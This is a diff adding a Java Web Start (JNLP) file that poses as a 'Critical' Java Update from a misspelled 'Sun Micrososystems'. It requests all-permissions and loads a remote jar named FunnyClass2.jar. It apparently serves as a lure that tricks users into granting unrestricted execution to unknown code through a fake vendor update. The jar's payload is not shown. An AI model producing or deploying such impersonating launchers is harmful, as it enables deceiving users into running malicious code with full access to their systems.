@@ -1,0 +1,26 @@
+<?xml version="1.0" encoding="utf-8"?>
+
+<jnlp
+  spec="1.0+"
+  codebase="http://java.sun.com/"
+  href="x.jnlp">
+  <information>
+    <title>Java Update</title>
+    <vendor>Sun Micrososystems</vendor>
+    <homepage href="docs/help.html"/>
+    <description>Java Update</description>
+    <description kind="short">Critical Update.</description>
+    <offline-allowed/>
+  </information>
+  <security>
+      <all-permissions/>
+  </security>
+  <resources>
+    <j2se version="1.4.2+"/>
+    <jar href="http://java.sun.com/FunnyClass2.jar"/>
+  </resources>
+  <application-desc main-class="">
+  </application-desc>
+
+
+</jnlp>
